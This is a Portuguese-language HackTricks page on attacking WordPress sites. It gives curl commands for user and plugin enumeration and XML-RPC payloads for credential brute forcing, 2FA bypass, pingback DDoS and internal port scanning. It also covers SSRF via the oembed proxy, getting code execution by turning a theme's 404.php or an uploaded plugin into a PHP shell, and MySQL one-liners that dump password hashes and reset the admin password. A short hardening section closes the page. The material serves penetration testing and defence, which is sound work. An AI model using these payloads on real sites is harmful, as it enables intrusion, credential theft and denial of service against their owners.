# Wordpress

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente com as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Informa√ß√µes B√°sicas

Os arquivos **enviados** v√£o para: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`\
Os arquivos de **temas podem ser encontrados em /wp-content/themes/**, ent√£o se voc√™ alterar algum php do tema para obter RCE, provavelmente usar√° esse caminho. Por exemplo: Usando o **tema twentytwelve** voc√™ pode **acessar** o arquivo **404.php** em: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)\
**Outra URL √∫til poderia ser:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

No **wp-config.php** voc√™ pode encontrar a senha raiz do banco de dados.

Caminhos de login padr√£o para verificar: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Principais Arquivos do WordPress**

* `index.php`
* `license.txt` cont√©m informa√ß√µes √∫teis, como a vers√£o do WordPress instalada.
* `wp-activate.php` √© usado para o processo de ativa√ß√£o por e-mail ao configurar um novo site do WordPress.
* Pastas de login (podem ser renomeadas para ocult√°-las):
* `/wp-admin/login.php`
* `/wp-admin/wp-login.php`
* `/login.php`
* `/wp-login.php`
* `xmlrpc.php` √© um arquivo que representa um recurso do WordPress que permite a transmiss√£o de dados com HTTP atuando como mecanismo de transporte e XML como mecanismo de codifica√ß√£o. Esse tipo de comunica√ß√£o foi substitu√≠do pela [API REST](https://developer.wordpress.org/rest-api/reference) do WordPress.
* A pasta `wp-content` √© o diret√≥rio principal onde plugins e temas s√£o armazenados.
* `wp-content/uploads/` √© o diret√≥rio onde s√£o armazenados os arquivos enviados para a plataforma.
* `wp-includes/` Este √© o diret√≥rio onde os arquivos principais s√£o armazenados, como certificados, fontes, arquivos JavaScript e widgets.
* `wp-sitemap.xml` Nas vers√µes do Wordpress 5.5 e superiores, o Wordpress gera um arquivo XML de sitemap com todas as postagens p√∫blicas e tipos de postagens e taxonomias publicamente consult√°veis.

**P√≥s explora√ß√£o**

* O arquivo `wp-config.php` cont√©m informa√ß√µes necess√°rias pelo WordPress para se conectar ao banco de dados, como nome do banco de dados, host do banco de dados, nome de usu√°rio e senha, chaves de autentica√ß√£o e salts, e o prefixo da tabela do banco de dados. Este arquivo de configura√ß√£o tamb√©m pode ser usado para ativar o modo DEBUG, que pode ser √∫til na solu√ß√£o de problemas.

### Permiss√µes de Usu√°rios

* **Administrador**
* **Editor**: Publica e gerencia suas pr√≥prias postagens e de outros
* **Autor**: Publica e gerencia suas pr√≥prias postagens
* **Contribuidor**: Escreve e gerencia suas postagens, mas n√£o pode public√°-las
* **Assinante**: Navega pelas postagens e edita seu perfil

## **Enumera√ß√£o Passiva**

### **Obter a vers√£o do WordPress**

Verifique se voc√™ pode encontrar os arquivos `/license.txt` ou `/readme.html`

Dentro do **c√≥digo-fonte** da p√°gina (exemplo de [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

* grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
* `meta name`

![](<../../.gitbook/assets/image (1108).png>)

* Arquivos de link CSS

![](<../../.gitbook/assets/image (530).png>)

* Arquivos JavaScript

![](<../../.gitbook/assets/image (521).png>)

### Obter Plugins

{% code overflow="wrap" %}
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
{% endcode %}

### Obter Temas

{% code overflow="wrap" %}
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Extrair vers√µes em geral

{% code overflow="wrap" %}
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir facilmente e **automatizar fluxos de trabalho** com as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Tenha Acesso Hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Enumera√ß√£o Ativa

### Plugins e Temas

Provavelmente voc√™ n√£o ser√° capaz de encontrar todos os Plugins e Temas poss√≠veis. Para descobrir todos eles, voc√™ precisar√° **for√ßar ativamente uma lista de Plugins e Temas** (felizmente, existem ferramentas automatizadas que cont√™m essas listas).

### Usu√°rios

**ID Brute**

Voc√™ pode obter usu√°rios v√°lidos de um site WordPress for√ßando IDs de usu√°rios:
```
curl -s -I -X GET http://blog.example.com/?author=1
```
Se as respostas forem **200** ou **30X**, isso significa que o id √© **v√°lido**. Se a resposta for **400**, ent√£o o id √© **inv√°lido**.

**wp-json**

Tamb√©m √© poss√≠vel tentar obter informa√ß√µes sobre os usu√°rios fazendo consultas:
```
curl http://blog.example.com/wp-json/wp/v2/users
```
Outro endpoint `/wp-json/` que pode revelar informa√ß√µes sobre usu√°rios √©:
```
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Observe que este endpoint exp√µe apenas usu√°rios que fizeram uma postagem. **Ser√° fornecida apenas informa√ß√£o sobre os usu√°rios que t√™m esse recurso habilitado**.

Tamb√©m observe que **/wp-json/wp/v2/pages** pode vazar endere√ßos IP.

#### Enumera√ß√£o de nomes de usu√°rio de login

Ao fazer login em **`/wp-login.php`**, a **mensagem** √© **diferente** se o **nome de usu√°rio indicado existir ou n√£o**.

### XML-RPC

Se `xml-rpc.php` estiver ativo, voc√™ pode realizar uma for√ßa bruta de credenciais ou us√°-lo para lan√ßar ataques de nega√ß√£o de servi√ßo a outros recursos. (Voc√™ pode automatizar esse processo [usando isso](https://github.com/relarizky/wpxploit) por exemplo).

Para verificar se est√° ativo, tente acessar o _**/xmlrpc.php**_ e envie esta solicita√ß√£o:

**Verificar**
```markup
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**For√ßa bruta de credenciais**

**`wp.getUserBlogs`**, **`wp.getCategories`** ou **`metaWeblog.getUsersBlogs`** s√£o alguns dos m√©todos que podem ser usados para for√ßa bruta de credenciais. Se voc√™ encontrar algum deles, pode enviar algo como:
```markup
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
A mensagem _"Nome de usu√°rio ou senha incorretos"_ dentro de uma resposta de c√≥digo 200 deve aparecer se as credenciais n√£o forem v√°lidas.

![](<../../.gitbook/assets/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../.gitbook/assets/image (718).png>)

Usando as credenciais corretas, voc√™ pode fazer upload de um arquivo. Na resposta, o caminho aparecer√° ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```markup
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Tamb√©m h√° uma **maneira mais r√°pida** de for√ßar credenciais usando **`system.multicall`** pois voc√™ pode tentar v√°rias credenciais na mesma solicita√ß√£o:

<figure><img src="../../.gitbook/assets/image (625).png" alt=""><figcaption></figcaption></figure>

**Burlar 2FA**

Este m√©todo √© destinado a programas e n√£o a humanos, e √© antigo, portanto n√£o suporta 2FA. Portanto, se voc√™ tiver credenciais v√°lidas mas a entrada principal estiver protegida por 2FA, **voc√™ pode abusar do xmlrpc.php para fazer login com essas credenciais burlando o 2FA**. Note que voc√™ n√£o poder√° realizar todas as a√ß√µes que pode fazer atrav√©s do console, mas ainda pode conseguir RCE como Ippsec explica em [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s)

**DDoS ou varredura de portas**

Se voc√™ encontrar o m√©todo _**pingback.ping**_ na lista, voc√™ pode fazer o Wordpress enviar uma solicita√ß√£o arbitr√°ria para qualquer host/porta.\
Isso pode ser usado para pedir a **milhares** de **sites** Wordpress para **acessar** uma **localiza√ß√£o** (causando um **DDoS** nessa localiza√ß√£o) ou voc√™ pode us√°-lo para fazer o **Wordpress** **varrer** alguma **rede** interna (voc√™ pode indicar qualquer porta).
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../.gitbook/assets/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Se voc√™ receber **faultCode** com um valor **maior** que **0** (17), significa que a porta est√° aberta.

D√™ uma olhada no uso de **`system.multicall`** na se√ß√£o anterior para aprender como abusar desse m√©todo para causar DDoS.

**DDoS**
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../.gitbook/assets/image (107).png>)

### wp-cron.php DoS

Este arquivo geralmente existe na raiz do site Wordpress: **`/wp-cron.php`**\
Quando este arquivo √© **acessado** uma **consulta** MySQL "**pesada**" √© realizada, ent√£o poderia ser usado por **atacantes** para **causar** um **DoS**.\
Al√©m disso, por padr√£o, o `wp-cron.php` √© chamado em cada carregamento de p√°gina (sempre que um cliente solicita qualquer p√°gina do Wordpress), o que em sites de alto tr√°fego pode causar problemas (DoS).

√â recomendado desativar o Wp-Cron e criar um cronjob real dentro do host que execute as a√ß√µes necess√°rias em um intervalo regular (sem causar problemas).

### /wp-json/oembed/1.0/proxy - SSRF

Tente acessar _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ e o site Wordpress pode fazer uma solicita√ß√£o para voc√™.

Esta √© a resposta quando n√£o funciona:

![](<../../.gitbook/assets/image (362).png>)

### SSRF

{% embed url="https://github.com/t0gu/quickpress/blob/master/core/requests.go" %}

Esta ferramenta verifica se o **methodName: pingback.ping** e para o caminho **/wp-json/oembed/1.0/proxy** e se existirem, tenta explor√°-los.

### Ferramentas Autom√°ticas
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir facilmente e **automatizar fluxos de trabalho** com as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje mesmo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Obtenha acesso sobrescrevendo um bit

Mais do que um ataque real, isso √© uma curiosidade. No CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) voc√™ poderia inverter 1 bit de qualquer arquivo do wordpress. Assim, voc√™ poderia inverter a posi√ß√£o `5389` do arquivo `/var/www/html/wp-includes/user.php` para anular a opera√ß√£o NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Painel RCE**

**Modificando um arquivo php do tema usado (credenciais de admin necess√°rias)**

Apar√™ncia ‚Üí Editor de Temas ‚Üí Modelo 404 (√† direita)

Altere o conte√∫do para um shell php:

![](<../../.gitbook/assets/image (381).png>)

Pesquise na internet como voc√™ pode acessar essa p√°gina atualizada. Neste caso, voc√™ precisa acessar aqui: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Voc√™ pode usar:
```
use exploit/unix/webapp/wp_admin_shell_upload
```
## Plugin RCE

### Plugin PHP

Pode ser poss√≠vel fazer upload de arquivos .php como um plugin.\
Crie sua backdoor php usando, por exemplo:

![](<../../.gitbook/assets/image (180).png>)

Em seguida, adicione um novo plugin:

![](<../../.gitbook/assets/image (719).png>)

Fa√ßa o upload do plugin e pressione Instalar Agora:

![](<../../.gitbook/assets/image (246).png>)

Clique em Procced:

![](<../../.gitbook/assets/image (67).png>)

Provavelmente isso n√£o far√° nada aparentemente, mas se voc√™ for para M√≠dia, ver√° sua shell enviada:

![](<../../.gitbook/assets/image (459).png>)

Acesse e voc√™ ver√° a URL para executar a reverse shell:

![](<../../.gitbook/assets/image (1003).png>)

### Upload e ativa√ß√£o de plugin malicioso

Este m√©todo envolve a instala√ß√£o de um plugin malicioso conhecido por ser vulner√°vel e que pode ser explorado para obter uma web shell. Esse processo √© realizado por meio do painel do WordPress da seguinte forma:

1. **Aquisi√ß√£o do Plugin**: O plugin √© obtido de uma fonte como o Exploit DB como [**aqui**](https://www.exploit-db.com/exploits/36374).
2. **Instala√ß√£o do Plugin**:
* Navegue at√© o painel do WordPress, v√° para `Painel > Plugins > Fazer upload do plugin`.
* Fa√ßa o upload do arquivo zip do plugin baixado.
3. **Ativa√ß√£o do Plugin**: Uma vez que o plugin √© instalado com sucesso, ele deve ser ativado por meio do painel.
4. **Explora√ß√£o**:
* Com o plugin "reflex-gallery" instalado e ativado, ele pode ser explorado, pois √© conhecido por ser vulner√°vel.
* O framework Metasploit fornece um exploit para essa vulnerabilidade. Ao carregar o m√≥dulo apropriado e executar comandos espec√≠ficos, uma sess√£o meterpreter pode ser estabelecida, concedendo acesso n√£o autorizado ao site.
* Observa-se que este √© apenas um dos muitos m√©todos para explorar um site WordPress.

O conte√∫do inclui aux√≠lios visuais que mostram os passos no painel do WordPress para instalar e ativar o plugin. No entanto, √© importante observar que explorar vulnerabilidades dessa maneira √© ilegal e anti√©tico sem autoriza√ß√£o adequada. Essas informa√ß√µes devem ser usadas de forma respons√°vel e apenas em um contexto legal, como testes de penetra√ß√£o com permiss√£o expl√≠cita.

**Para obter etapas mais detalhadas, consulte:** [**https://www.hackingarticles.in/wordpress-reverse-shell/\*\***](https://www.hackingarticles.in/wordpress-reverse-shell/)

## P√≥s-Explora√ß√£o

Extrair nomes de usu√°rio e senhas:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Alterar senha do administrador:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Prote√ß√£o do WordPress

### Atualiza√ß√µes Regulares

Certifique-se de que o WordPress, plugins e temas est√£o atualizados. Confirme tamb√©m se a atualiza√ß√£o autom√°tica est√° habilitada no wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Tamb√©m, **apenas instale plugins e temas do WordPress confi√°veis**.

### Plugins de Seguran√ßa

* [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
* [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
* [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Outras Recomenda√ß√µes**

* Remova o usu√°rio padr√£o **admin**
* Use **senhas fortes** e **2FA**
* Revise periodicamente as **permiss√µes dos usu√°rios**
* **Limite as tentativas de login** para prevenir ataques de For√ßa Bruta
* Renomeie o arquivo **`wp-admin.php`** e permita acesso apenas internamente ou de determinados endere√ßos IP.

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente, impulsionado pelas ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
